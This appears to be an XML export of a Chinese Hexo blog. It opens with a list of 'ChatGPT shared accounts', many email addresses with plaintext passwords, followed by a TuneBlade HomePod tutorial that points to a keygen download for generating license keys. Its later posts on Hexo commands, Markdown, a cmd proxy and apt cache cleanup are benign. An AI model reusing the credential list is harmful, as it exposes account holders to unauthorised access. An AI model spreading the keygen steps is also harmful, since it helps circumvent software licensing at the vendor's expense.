<p>账号12：<a href="mailto:&#x72;&#97;&#x6c;&#112;&#104;&#110;&#x61;&#109;&#x65;&#114;&#x33;&#50;&#x64;&#64;&#104;&#111;&#x74;&#109;&#97;&#x69;&#x6c;&#46;&#x63;&#x6f;&#109;">&#x72;&#97;&#x6c;&#112;&#104;&#110;&#x61;&#109;&#x65;&#114;&#x33;&#50;&#x64;&#64;&#104;&#111;&#x74;&#109;&#97;&#x69;&#x6c;&#46;&#x63;&#x6f;&#109;</a><br>密码12：F85T86YtbL</p>
<p>账号13：<a href="mailto:&#99;&#101;&#108;&#x69;&#x6e;&#x61;&#98;&#117;&#108;&#108;&#105;&#101;&#118;&#109;&#117;&#x40;&#x68;&#x6f;&#x74;&#x6d;&#97;&#x69;&#x6c;&#46;&#99;&#x6f;&#109;">&#99;&#101;&#108;&#x69;&#x6e;&#x61;&#98;&#117;&#108;&#108;&#105;&#101;&#118;&#109;&#117;&#x40;&#x68;&#x6f;&#x74;&#x6d;&#97;&#x69;&#x6c;&#46;&#99;&#x6f;&#109;</a><br>密码13：OqTz0lj525</p>
<p>账号14：<a href="mailto:&#99;&#x68;&#97;&#x6e;&#x61;&#x66;&#100;&#x69;&#x64;&#101;&#108;&#97;&#x65;&#116;&#64;&#104;&#x6f;&#x74;&#x6d;&#97;&#105;&#108;&#46;&#x63;&#x6f;&#109;">&#99;&#x68;&#97;&#x6e;&#x61;&#x66;&#100;&#x69;&#x64;&#101;&#108;&#97;&#x65;&#116;&#64;&#104;&#x6f;&#x74;&#x6d;&#97;&#105;&#108;&#46;&#x63;&#x6f;&#109;</a><br>密码14：6x3CM4pPYY</p>
<p>账号15：<a href="mailto:&#x61;&#x6c;&#x69;&#116;&#x61;&#x30;&#x37;&#x70;&#98;&#111;&#x67;&#100;&#x6f;&#x6e;&#64;&#x68;&#111;&#x74;&#x6d;&#x61;&#105;&#108;&#46;&#99;&#111;&#109;">&#x61;&#x6c;&#x69;&#116;&#x61;&#x30;&#x37;&#x70;&#98;&#111;&#x67;&#100;&#x6f;&#x6e;&#64;&#x68;&#111;&#x74;&#x6d;&#x61;&#105;&#108;&#46;&#99;&#111;&#109;</a><br>密码15：Umppl1ylc0</p>
<p>账号16：<a href="mailto:&#97;&#x76;&#x65;&#114;&#105;&#x6c;&#108;&#116;&#120;&#x67;&#116;&#64;&#104;&#111;&#116;&#109;&#97;&#105;&#108;&#x2e;&#99;&#111;&#x6d;">&#97;&#x76;&#x65;&#114;&#105;&#x6c;&#108;&#116;&#120;&#x67;&#116;&#64;&#104;&#111;&#116;&#109;&#97;&#105;&#108;&#x2e;&#99;&#111;&#x6d;</a><br>密码16：94cymN2p42</p>
<p>账号17：<a href="mailto:&#x6d;&#111;&#98;&#121;&#102;&#111;&#x74;&#x6f;&#x68;&#121;&#x37;&#x40;&#104;&#111;&#116;&#109;&#97;&#x69;&#108;&#46;&#99;&#x6f;&#x6d;">&#x6d;&#111;&#98;&#121;&#102;&#111;&#x74;&#x6f;&#x68;&#121;&#x37;&#x40;&#104;&#111;&#116;&#109;&#97;&#x69;&#108;&#46;&#99;&#x6f;&#x6d;</a><br>密码17：c8iJi0Fd</p>
<p>账号18：<a href="mailto:&#109;&#x75;&#102;&#x69;&#x63;&#121;&#108;&#x65;&#x71;&#117;&#57;&#x40;&#104;&#x6f;&#x74;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#111;&#109;">&#109;&#x75;&#102;&#x69;&#x63;&#121;&#108;&#x65;&#x71;&#117;&#57;&#x40;&#104;&#x6f;&#x74;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#111;&#109;</a><br>密码18：5p0KWJf1D</p>
<p>账号19：<a href="mailto:&#110;&#x61;&#x65;&#104;&#97;&#x68;&#111;&#x67;&#117;&#106;&#111;&#x30;&#64;&#x68;&#111;&#116;&#109;&#97;&#x69;&#x6c;&#x2e;&#x63;&#111;&#109;">&#110;&#x61;&#x65;&#104;&#97;&#x68;&#111;&#x67;&#117;&#106;&#111;&#x30;&#64;&#x68;&#111;&#116;&#109;&#97;&#x69;&#x6c;&#x2e;&#x63;&#111;&#109;</a><br>密码19：xgH5o3jKV</p>
<p>账号20：<a href="mailto:&#x6e;&#97;&#x65;&#x6a;&#101;&#120;&#101;&#x6c;&#x69;&#98;&#x75;&#64;&#104;&#111;&#116;&#x6d;&#x61;&#x69;&#108;&#46;&#x63;&#111;&#109;">&#x6e;&#97;&#x65;&#x6a;&#101;&#120;&#101;&#x6c;&#x69;&#98;&#x75;&#64;&#104;&#111;&#116;&#x6d;&#x61;&#x69;&#108;&#46;&#x63;&#111;&#109;</a><br>密码20：fZg44fVeh</p>
<p>账号21：<a href="mailto:&#x6e;&#x61;&#x65;&#122;&#x68;&#97;&#x65;&#x73;&#x68;&#101;&#113;&#x75;&#115;&#105;&#116;&#x6f;&#64;&#111;&#117;&#116;&#x6c;&#x6f;&#111;&#107;&#46;&#99;&#111;&#109;">&#x6e;&#x61;&#x65;&#122;&#x68;&#97;&#x65;&#x73;&#x68;&#101;&#113;&#x75;&#115;&#105;&#116;&#x6f;&#64;&#111;&#117;&#116;&#x6c;&#x6f;&#111;&#107;&#46;&#99;&#111;&#109;</a><br>密码21：PtRbh31IF</p>
<p>账号22：<a href="mailto:&#x6e;&#x65;&#108;&#97;&#x64;&#101;&#x72;&#111;&#107;&#x61;&#x40;&#104;&#111;&#x74;&#x6d;&#97;&#105;&#108;&#x2e;&#x63;&#x6f;&#109;">&#x6e;&#x65;&#108;&#97;&#x64;&#101;&#x72;&#111;&#107;&#x61;&#x40;&#104;&#111;&#x74;&#x6d;&#97;&#105;&#108;&#x2e;&#x63;&#x6f;&#109;</a><br>密码22：McTk3Qrz</p>
<p>账号23：<a href="mailto:&#x70;&#x79;&#x76;&#x6f;&#x68;&#x79;&#119;&#97;&#101;&#108;&#105;&#x40;&#111;&#x75;&#x74;&#108;&#x6f;&#111;&#x6b;&#x2e;&#99;&#111;&#109;">&#x70;&#x79;&#x76;&#x6f;&#x68;&#x79;&#119;&#97;&#101;&#108;&#105;&#x40;&#111;&#x75;&#x74;&#108;&#x6f;&#111;&#x6b;&#x2e;&#99;&#111;&#109;</a><br>密码23：Ehk9d5QFz4</p>
<p>账号24：<a href="mailto:&#x71;&#97;&#x64;&#97;&#x6b;&#x69;&#100;&#x6f;&#x6e;&#101;&#64;&#x68;&#x6f;&#x74;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#109;">&#x71;&#97;&#x64;&#97;&#x6b;&#x69;&#100;&#x6f;&#x6e;&#101;&#64;&#x68;&#x6f;&#x74;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#109;</a><br>密码24：I836s6941q</p>
<p>账号25：<a href="mailto:&#113;&#x61;&#x72;&#97;&#x65;&#115;&#x69;&#115;&#x68;&#101;&#98;&#x79;&#x39;&#x40;&#104;&#x6f;&#116;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#x6f;&#109;">&#113;&#x61;&#x72;&#97;&#x65;&#115;&#x69;&#115;&#x68;&#101;&#98;&#x79;&#x39;&#x40;&#104;&#x6f;&#116;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#x6f;&#109;</a><br>密码25：UQkJim80c</p>
<p>账号26：<a href="mailto:&#113;&#97;&#120;&#105;&#98;&#x65;&#x72;&#x61;&#x73;&#105;&#112;&#121;&#64;&#111;&#x75;&#116;&#x6c;&#x6f;&#111;&#107;&#x2e;&#99;&#x6f;&#109;">&#113;&#97;&#120;&#105;&#98;&#x65;&#x72;&#x61;&#x73;&#105;&#112;&#121;&#64;&#111;&#x75;&#116;&#x6c;&#x6f;&#111;&#107;&#x2e;&#99;&#x6f;&#109;</a><br>密码26：XVYluIYy2P</p>
<p>账号27：<a href="mailto:&#x71;&#101;&#108;&#117;&#122;&#104;&#x61;&#x65;&#x6c;&#97;&#103;&#121;&#52;&#64;&#x68;&#111;&#x74;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#111;&#109;">&#x71;&#101;&#108;&#117;&#122;&#104;&#x61;&#x65;&#x6c;&#97;&#103;&#121;&#52;&#64;&#x68;&#111;&#x74;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#111;&#109;</a><br>密码27：8qZEl20fR</p>
<p>账号28：<a href="mailto:&#113;&#x6f;&#98;&#105;&#x6c;&#x75;&#x6e;&#x6f;&#55;&#64;&#104;&#111;&#x74;&#109;&#97;&#105;&#x6c;&#x2e;&#99;&#x6f;&#x6d;">&#113;&#x6f;&#98;&#105;&#x6c;&#x75;&#x6e;&#x6f;&#55;&#64;&#104;&#111;&#x74;&#109;&#97;&#105;&#x6c;&#x2e;&#99;&#x6f;&#x6d;</a><br>密码28：4KiM2C0q9</p>
<p>账号29：<a href="mailto:&#x71;&#x75;&#112;&#105;&#112;&#97;&#101;&#115;&#104;&#x65;&#49;&#64;&#111;&#x75;&#116;&#x6c;&#x6f;&#111;&#x6b;&#46;&#x63;&#111;&#x6d;">&#x71;&#x75;&#112;&#105;&#112;&#97;&#101;&#115;&#104;&#x65;&#49;&#64;&#111;&#x75;&#116;&#x6c;&#x6f;&#111;&#x6b;&#46;&#x63;&#111;&#x6d;</a><br>密码29：4j9NSpGHEZ</p>
<p>账号30：<a href="mailto:&#x71;&#121;&#x73;&#x68;&#121;&#109;&#x69;&#115;&#x69;&#102;&#x69;&#x30;&#x40;&#104;&#111;&#x74;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#x63;&#111;&#109;">&#x71;&#121;&#x73;&#x68;&#121;&#109;&#x69;&#115;&#x69;&#102;&#x69;&#x30;&#x40;&#104;&#111;&#x74;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#x63;&#111;&#109;</a><br>密码30：Sfp9D0UNK4</p>
<p>账号31：<a href="mailto:&#x72;&#97;&#x65;&#x68;&#111;&#x74;&#117;&#115;&#x68;&#x61;&#119;&#111;&#64;&#x68;&#111;&#x74;&#x6d;&#97;&#x69;&#108;&#x2e;&#99;&#x6f;&#109;">&#x72;&#97;&#x65;&#x68;&#111;&#x74;&#117;&#115;&#x68;&#x61;&#119;&#111;&#64;&#x68;&#111;&#x74;&#x6d;&#97;&#x69;&#108;&#x2e;&#99;&#x6f;&#109;</a><br>密码31：2d0H8o9L</p>
<p>账号32：<a href="mailto:&#114;&#97;&#x65;&#108;&#101;&#107;&#x75;&#115;&#x68;&#x75;&#100;&#x69;&#x70;&#x79;&#x40;&#x68;&#x6f;&#116;&#x6d;&#97;&#x69;&#x6c;&#46;&#99;&#x6f;&#x6d;">&#114;&#97;&#x65;&#108;&#101;&#107;&#x75;&#115;&#x68;&#x75;&#100;&#x69;&#x70;&#x79;&#x40;&#x68;&#x6f;&#116;&#x6d;&#97;&#x69;&#x6c;&#46;&#99;&#x6f;&#x6d;</a><br>密码32：xdeZv30KQ</p>
<p>账号33：<a href="mailto:&#114;&#x61;&#101;&#x78;&#x61;&#122;&#x68;&#x65;&#108;&#111;&#x40;&#111;&#117;&#x74;&#x6c;&#x6f;&#x6f;&#x6b;&#46;&#x63;&#x6f;&#x6d;">&#114;&#x61;&#101;&#x78;&#x61;&#122;&#x68;&#x65;&#108;&#111;&#x40;&#111;&#117;&#x74;&#x6c;&#x6f;&#x6f;&#x6b;&#46;&#x63;&#x6f;&#x6d;</a><br>密码34：0T1Kw67eu</p>
<p>账号35：<a href="mailto:&#114;&#x61;&#x6c;&#x61;&#122;&#x68;&#x6f;&#103;&#x61;&#x73;&#121;&#110;&#121;&#x40;&#x68;&#x6f;&#x74;&#109;&#x61;&#x69;&#108;&#x2e;&#x63;&#x6f;&#109;">&#114;&#x61;&#x6c;&#x61;&#122;&#x68;&#x6f;&#103;&#x61;&#x73;&#121;&#110;&#121;&#x40;&#x68;&#x6f;&#x74;&#109;&#x61;&#x69;&#108;&#x2e;&#x63;&#x6f;&#109;</a><br>密码35：5E6g0R12De</p>
<p>账号36：<a href="mailto:&#x72;&#101;&#118;&#111;&#x6e;&#x61;&#x70;&#111;&#x78;&#105;&#x72;&#97;&#52;&#64;&#111;&#x75;&#116;&#x6c;&#111;&#111;&#x6b;&#46;&#x63;&#111;&#x6d;">&#x72;&#101;&#118;&#111;&#x6e;&#x61;&#x70;&#111;&#x78;&#105;&#x72;&#97;&#52;&#64;&#111;&#x75;&#116;&#x6c;&#111;&#111;&#x6b;&#46;&#x63;&#111;&#x6d;</a><br>密码36：94G15y00kQ</p>
<p>账号37：<a href="mailto:&#114;&#105;&#122;&#x68;&#121;&#x6d;&#105;&#116;&#x69;&#119;&#97;&#x65;&#55;&#64;&#111;&#117;&#x74;&#x6c;&#x6f;&#x6f;&#x6b;&#46;&#x63;&#x6f;&#109;">&#114;&#105;&#122;&#x68;&#121;&#x6d;&#105;&#116;&#x69;&#119;&#97;&#x65;&#55;&#64;&#111;&#117;&#x74;&#x6c;&#x6f;&#x6f;&#x6b;&#46;&#x63;&#x6f;&#109;</a><br>密码37：gZq4C6NJRm</p>
<h1 id="ChatGPT-共享账号2"><a href="#ChatGPT-共享账号2" class="headerlink" title="ChatGPT 共享账号2"></a>ChatGPT 共享账号2</h1><p>账号1：<a href="mailto:&#x6a;&#97;&#x63;&#107;&#x40;&#x67;&#x70;&#x74;&#x6f;&#99;&#101;&#97;&#110;&#x2e;&#99;&#111;&#109;">&#x6a;&#97;&#x63;&#107;&#x40;&#x67;&#x70;&#x74;&#x6f;&#99;&#101;&#97;&#110;&#x2e;&#99;&#111;&#109;</a><br>密码1：ucOKRT5y8t</p>
<p>账号2：<a href="mailto:&#114;&#111;&#x73;&#x65;&#x40;&#x67;&#x70;&#x74;&#111;&#99;&#x65;&#x61;&#x6e;&#x2e;&#x63;&#111;&#x6d;">&#114;&#111;&#x73;&#x65;&#x40;&#x67;&#x70;&#x74;&#111;&#99;&#x65;&#x61;&#x6e;&#x2e;&#x63;&#111;&#x6d;</a><br>密码2：P4ix7EgqBO</p>
<p>账号3：<a href="mailto:&#x74;&#111;&#x6d;&#64;&#103;&#x70;&#x74;&#111;&#99;&#x65;&#97;&#x6e;&#x2e;&#99;&#111;&#x6d;">&#x74;&#111;&#x6d;&#64;&#103;&#x70;&#x74;&#111;&#99;&#x65;&#97;&#x6e;&#x2e;&#99;&#111;&#x6d;</a><br>密码3：Ds6boY1WmX</p>
<p>账号4：<a href="mailto:&#x64;&#97;&#x69;&#115;&#121;&#x40;&#103;&#112;&#116;&#x6f;&#99;&#101;&#97;&#110;&#x2e;&#x63;&#x6f;&#x6d;">&#x64;&#97;&#x69;&#115;&#121;&#x40;&#103;&#112;&#116;&#x6f;&#99;&#101;&#97;&#110;&#x2e;&#x63;&#x6f;&#x6d;</a><br>密码4：WT0kZxV9tw</p>
<p>账号5：<a href="mailto:&#97;&#x6c;&#x69;&#x63;&#x65;&#64;&#103;&#x70;&#x74;&#x6f;&#x63;&#x65;&#x61;&#x6e;&#x2e;&#99;&#111;&#109;">&#97;&#x6c;&#x69;&#x63;&#x65;&#64;&#103;&#x70;&#x74;&#x6f;&#x63;&#x65;&#x61;&#x6e;&#x2e;&#99;&#111;&#109;</a><br>密码5：qLpB2g1YOc</p>
<p>注意：账号密码将定期更新，不要私自更改密码，请勿用作非法用途！</p>
<h1 id="ChatGPT-共享账号发布页：https-terobox-com"><a href="#ChatGPT-共享账号发布页：https-terobox-com" class="headerlink" title="ChatGPT 共享账号发布页：https://terobox.com/"></a>ChatGPT 共享账号发布页：<a href="https://terobox.com/">https://terobox.com/</a></h1><h1 id="ChatGPT登录地址"><a href="#ChatGPT登录地址" class="headerlink" title="ChatGPT登录地址"></a>ChatGPT登录地址</h1><p>ChatGPT：<a href="https://chat.openai.com/auth/login">https://chat.openai.com/auth/login</a></p>
]]></content>
      <categories>
        <category>ai</category>
        <category>chatgpt</category>
      </categories>
      <tags>
        <tag>chatgpt</tag>
        <tag>ai</tag>
      </tags>
  </entry>
  <entry>
    <title>在windows上借助tuneblade连接使用homepod</title>
    <url>/posts/6a2c3edb/</url>
    <content><![CDATA[<h1 id="操作环境"><a href="#操作环境" class="headerlink" title="操作环境"></a>操作环境</h1><ol>
<li>Windows 10(据网上资料可推断应该没有Windows版本的限制)</li>
<li>TuneBlade 1.8.0.0</li>
<li>keygen许可证计算工具（即激活工具，文中包含下载链接）</li>
<li>与电脑在同一局域网的HomePod一台</li>
</ol>
<h1 id="也有人用Airfoil，TuneBlade与Airfoil两款软件的区别是："><a href="#也有人用Airfoil，TuneBlade与Airfoil两款软件的区别是：" class="headerlink" title="也有人用Airfoil，TuneBlade与Airfoil两款软件的区别是："></a>也有人用Airfoil，TuneBlade与Airfoil两款软件的区别是：</h1><p>TuneBlade是直接推动整个电脑的音频<br>Airfoil是可以针对单个应用进行音频推送</p>
<h1 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h1><h2 id="下载TuneBlade安装"><a href="#下载TuneBlade安装" class="headerlink" title="下载TuneBlade安装"></a>下载TuneBlade安装</h2><p>官网：<a href="http://www.tuneblade.com/">http://www.tuneblade.com/</a><br>TuneBlade 1.8.0.0官网直接下载地址传送门：<a href="http://files.breakfreeaudio.com/downloads/TuneBlade_Installer_1_8_0_0.exe">http://files.breakfreeaudio.com/downloads/TuneBlade_Installer_1_8_0_0.exe</a><br>百度网盘下载：<br>链接：<a href="https://pan.baidu.com/s/1d_WGkVw-Ma6Uz0Slp9zgOA">https://pan.baidu.com/s/1d_WGkVw-Ma6Uz0Slp9zgOA</a> 提取码：yjw2</p>
<h2 id="首次打开TuneBlade"><a href="#首次打开TuneBlade" class="headerlink" title="首次打开TuneBlade"></a>首次打开TuneBlade</h2><p>软件如果没有许可证的话使用10分钟就会断开连接<br>许可证计算工具(激活工具)<br>链接: <a href="https://pan.baidu.com/s/1mfipkVmGgxzGhiTUtYvkoA?pwd=say4">https://pan.baidu.com/s/1mfipkVmGgxzGhiTUtYvkoA?pwd=say4</a> 提取码: say4 复制这段内容后打开百度网盘手机App，操作更方便哦<br><img src="/img/homepod/1.webp" alt="16557045-f7879c7e1488c2ae"><br>打开keygen.exe程序输入ID(任意邮箱均可)<br>点击按钮 Genracte Serial 即可计算出对应的Key，然后依次输入到TuneBlade中<br><img src="/img/homepod/2.webp" alt="16557045-0568811c40dd800f"><br>输入许可证信息</p>
<h2 id="点击按钮-Unlock-即可激活"><a href="#点击按钮-Unlock-即可激活" class="headerlink" title="点击按钮 Unlock 即可激活"></a>点击按钮 Unlock 即可激活</h2><p><img src="/img/homepod/3.webp" alt="16557045-1cab9eab4c8055b1-1679880636412"><br>激活成功<br>到这里整个连接过程就完成了，现在只要电脑播放的声音都会转发到HomePod<br>设置部分中英对照，希望能帮助到部分网友<br><img src="/img/homepod/4.webp" alt="16557045-b718534d877e5843"><br><img src="/img/homepod/5.webp" alt="16557045-aaad615782a9dab1"><br>不同的流大小与推到设备的音频可靠性成正比关系<br><img src="/img/homepod/6.webp" alt="16557045-04a9d9785bd6339d"><br>可以切换不同的音源模式<br>如果正在推流到设备会提示不能修改，点击按钮 Stop Streaming即可停止<br><img src="/img/homepod/7.webp" alt="16557045-571cdf32a9bc41fa"><br>建议勾选Auto Connect方便下次使用<br><img src="/img/homepod/8.webp" alt="16557045-98dad16231535167"><br><img src="/img/homepod/9.webp" alt="16557045-c388d5c0547f0a80"><br>缓冲区信息<br><img src="/img/homepod/10.webp" alt="16557045-8524802d5b5761f4"><br>设备连接成功</p>
<h1 id="另外TuneBlade官网还有以下扩展可以使用"><a href="#另外TuneBlade官网还有以下扩展可以使用" class="headerlink" title="另外TuneBlade官网还有以下扩展可以使用"></a>另外TuneBlade官网还有以下扩展可以使用</h1><p>使用手机对其进行远程控制（目前仅支持IOS）<br>远程控制手机版APP传送门(手机点击可直接跳转)：<a href="https://itunes.apple.com/cn/app/remote-for-tuneblade/id910930210?mt=8">https://itunes.apple.com/cn/app/remote-for-tuneblade/id910930210?mt=8</a><br>AirPlay 音频接收器 TuneAero<br>可以实现从苹果设备或别的带有AirPlay功能的设备将音频到电脑播放</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>homepod</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>homepod</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo常用命令以及Markdown语法</title>
    <url>/posts/f6bf5b04/</url>
    <content><![CDATA[<p>前端 Hexo常用命令以及 Markdown语法<br>简单记录使用 Github 更新博文过程中常用的 Hexo 命令和 Markdown 语法。<br>Hexo 约有二十个命令，但普通用户经常使用的大概只有那么几个。<br>Markdown 语法更简单，看一遍基本就会了。</p>
<h1 id="hexo-s"><a href="#hexo-s" class="headerlink" title="hexo s"></a>hexo s</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s</span><br></pre></td></tr></table></figure>
<p>启动本地服务器，用于预览主题。默认地址： <a href="http://localhost:4000/">http://localhost:4000/</a></p>
<p>hexo s 是 hexo server 的缩写，命令效果一致；<br>预览的同时可以修改文章内容或主题代码，保存后刷新页面即可；<br>对 Hexo 根目录 _config.yml 的修改，需要重启本地服务器后才能预览效果。</p>
<h1 id="hexo-n"><a href="#hexo-n" class="headerlink" title="hexo n"></a>hexo n</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">n &quot;学习笔记  六&quot;</span><br></pre></td></tr></table></figure>
<p>新建一篇标题为 学习笔记 六 的文章，因为标题里有空格，所以加上了引号。</p>
<p>文章标题可以在对应 md 文件里改，新建时标题可以写的简单些；<br>hexo n 是 hexo new 的缩写，命令效果一致。</p>
<h1 id="hexo-n-page"><a href="#hexo-n-page" class="headerlink" title="hexo n page"></a>hexo n page</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">n page aboutme</span><br></pre></td></tr></table></figure>
<p>新建一个标题为 aboutme 的页面，默认链接地址为 主页地址&#x2F;aboutme&#x2F;</p>
<p>标题可以为中文，但一般习惯用英文；<br>页面标题和文章一样可以随意修改；<br>页面不会出现在首页文章列表和归档中，也不支持设置分类和标签。</p>
<h1 id="hexo-clean"><a href="#hexo-clean" class="headerlink" title="hexo clean"></a>hexo clean</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">clean</span><br></pre></td></tr></table></figure>
<p>清除缓存文件 db.json 和已生成的静态文件 public。</p>
<p>网站显示异常时可以执行这条命令试试。</p>
<h1 id="hexo-g"><a href="#hexo-g" class="headerlink" title="hexo g"></a>hexo g</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">g</span><br></pre></td></tr></table></figure>
<p>生成网站静态文件到默认设置的 public 文件夹。</p>
<p>便于查看网站生成的静态文件或者手动部署网站；<br>如果使用自动部署，不需要先执行该命令；<br>hexo g 是 hexo generate 的缩写，命令效果一致。</p>
<h1 id="hexo-g-d"><a href="#hexo-g-d" class="headerlink" title="hexo g -d"></a>hexo g -d</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g -d</span><br></pre></td></tr></table></figure>
<p>自动生成网站静态文件，并部署到设定的仓库。</p>
<h1 id="hexo-d-是-hexo-deploy-的缩写，命令效果一致。"><a href="#hexo-d-是-hexo-deploy-的缩写，命令效果一致。" class="headerlink" title="hexo d 是 hexo deploy 的缩写，命令效果一致。"></a>hexo d 是 hexo deploy 的缩写，命令效果一致。</h1><p>常用组合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo s</span><br><span class="line">hexo clean &amp;&amp; hexo d</span><br><span class="line">#清除缓存，生成静态文件，部署到仓库，上传文章索引</span><br><span class="line">hexo clean &amp;&amp; hexo g -d &amp;&amp; hexo algolia </span><br></pre></td></tr></table></figure>
<h1 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h1><p>hexo 是使用 Markdown 编辑文章的，我写的这些文章也都是用这种标记语言完成的。所以，我们先从 Markdown 说起。</p>
<h2 id="什么是-Markdown"><a href="#什么是-Markdown" class="headerlink" title="什么是 Markdown"></a>什么是 Markdown</h2><p>Markdown 语法<br>例文<br>你可以使用 vim 工具直接编辑 md 文件，也可以用记事本打开 md 文件编辑你的文章，也可以 Markdown 的编辑器编写，<br>有很多在线的编辑器，何有不少客户端的编辑器，也有很好用的编辑器，见本文最后示例链接。<br>Markdown 是一种轻量级标记语言，创始人为约翰·格鲁伯和亚伦·斯沃茨。它允许人们 “使用易读易写的纯文本格式编写文档，然后转换成有效的 XHTML 文档” ——维基百科<br>先简单介绍一下，Markdown 的语法，具体怎么用，我相信大家一看例文就马上明白了。</p>
<h2 id="Markdown-语法"><a href="#Markdown-语法" class="headerlink" title="Markdown 语法"></a>Markdown 语法</h2><p>1、分段： 两个回车<br>2、换行 两个空格 + 回车<br>3、标题 前后分别加井号（注意空格），井号数量多少表示不同分级 即 Markdown 可以表示一级标题到六级标题<br>4、引用 &gt;<br>5、列表 *，+，-，1.，选其中之一，注意后面有个空格<br>6、代码区块 四个空格开头<br>7、链接： [文字][编号] 最后在文章末尾加上 [编号]：链接地址<br>8、图片： !+[图面描述]+（图片地址），图片地址可以是本地路径，也可以是网络地址<br>9、强调 前后各一个（两个）下划线或者星号<br>10、代码 上下分别以三个&#96;（ESC 键下面 “~” 这个键）分隔，效果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@requires_authorization</span><br><span class="line">class SomeClass:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    </span><br><span class="line">    print &#x27;hello world&#x27;</span><br></pre></td></tr></table></figure>
<p>下面来看例文，你就马上明白，怎么来使用这些符号来写好一篇自己的博文了。<br><a href="https://www.zybuluo.com/mdeditor">点我看示例！</a></p>
]]></content>
      <categories>
        <category>web</category>
        <category>hexo</category>
        <category>markdown</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>hexo</tag>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>设置Windows系统的cmd命令行终端的代理</title>
    <url>/posts/57478801/</url>
    <content><![CDATA[<h1 id="启动服务端"><a href="#启动服务端" class="headerlink" title="启动服务端"></a>启动服务端</h1><p>首先，你要启动代理服务器，比如我的 v2ray :</p>
<p>配置CMD命令行<br>临时生效<br>如果只是暂时使用代理，你可以在windows的cmd命令行中，执行下面命令：</p>
<h1 id="使用sock5代理"><a href="#使用sock5代理" class="headerlink" title="使用sock5代理"></a>使用sock5代理</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set http_proxy=socks5://127.0.0.1:10808</span><br><span class="line">set https_proxy=socks5://127.0.0.1:10808</span><br></pre></td></tr></table></figure>
<p> 如果你要取消设置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set http_proxy=</span><br><span class="line">set https_proxy=</span><br></pre></td></tr></table></figure>
<p>临时生效方案中，当你关闭cmd，再次打开时，之前的设置将会失效，代理依然使用不了。</p>
<h1 id="长期生效"><a href="#长期生效" class="headerlink" title="长期生效"></a>长期生效</h1><p>为了每次打开cmd，cmd都使用代理，那么，可以通过设置系统环境变量的方式，进行设置。右键 我的电脑 -&gt; 属性 -&gt; 高级系统设置 -&gt; 高级 -&gt; 环境变量 ，然后在 系统环境 中，新建两个系统环境变量，变量名称分别为 https_proxy 和 http_proxy ，值为 https_proxy&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:10808 ：</p>
<h1 id="然后重启cmd命令行，使用"><a href="#然后重启cmd命令行，使用" class="headerlink" title="然后重启cmd命令行，使用"></a>然后重启cmd命令行，使用</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl www.google.com</span><br></pre></td></tr></table></figure>
<p>如果有内容返回，说明设置成功（不可以是 ping 命令进行测试）。 </p>
]]></content>
      <categories>
        <category>proxy</category>
        <category>os</category>
        <category>windows</category>
        <category>cmd</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>os</tag>
        <tag>windows</tag>
        <tag>cmd</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu软件包管理空间不足导致docker启动失败解决办法</title>
    <url>/posts/b8bbd52a/</url>
    <content><![CDATA[<blockquote>
<p>Ubuntu软件包管理空间不足，在&#x2F;var&#x2F;cache&#x2F;apt&#x2F;archive<br>在Ubuntu中安装软件时，提示： E: You don’t have enough free space in &#x2F;var&#x2F;cache&#x2F;apt&#x2F;archives&#x2F;. 在&#x2F;var&#x2F;cache&#x2F;apt&#x2F;archives&#x2F;中没有足够的可用空间。 &#x2F;var&#x2F;cache&#x2F;apt&#x2F;archives文件夹中的文件是使用sudo apt-get install<br>在Ubuntu中安装软件时，提示：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E: You don&#x27;t have enough free space in /var/cache/apt/archives/.</span><br></pre></td></tr></table></figure>
<p>在&#x2F;var&#x2F;cache&#x2F;apt&#x2F;archives&#x2F;中没有足够的可用空间。<br>Ubuntu软件包管理空间不足，在&#x2F;var&#x2F;cache&#x2F;apt&#x2F;archives&#x2F;中<br>&#x2F;var&#x2F;cache&#x2F;apt&#x2F;archives文件夹中的文件是使用sudo apt-get install appname时下载的安装文件，这些文件是可以清理的，若你系统空间不足的时候，可以想到从此处进行清理而获得空间。<br>清理的方法很简单：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get clean</span><br></pre></td></tr></table></figure>
<p>再次查看的时候，*.deb文件都不存在了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">#屏幕显示</span><br><span class="line">lock  partial</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>os</category>
        <category>ubuntu</category>
        <category>centos</category>
        <category>debian</category>
